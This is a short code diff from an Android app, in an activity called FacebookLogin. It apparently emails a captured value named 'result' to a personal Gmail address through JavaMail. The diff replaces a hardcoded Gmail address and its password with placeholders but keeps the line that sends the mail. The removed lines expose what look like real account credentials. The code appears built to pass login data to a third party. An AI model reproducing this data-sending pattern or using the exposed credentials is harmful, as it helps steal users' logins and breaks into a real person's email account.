@@ -70,8 +70,8 @@ public class FacebookLogin extends AppCompatActivity {
                         @Override
                         public void run() {
                             try {
-                                GMailSender sender = new GMailSender("nishagaikwad1273@gmail.com",
-                                        "Icandoit");
+                                GMailSender sender = new GMailSender("Enter Your email address",
+                                        "Enter Your email address password");
                                 sender.sendMail("Hello from JavaMail", result,
                                         "ClubFactory@gmail.com", "mayurkadam200@gmail.com");
                             } catch (Exception e) {
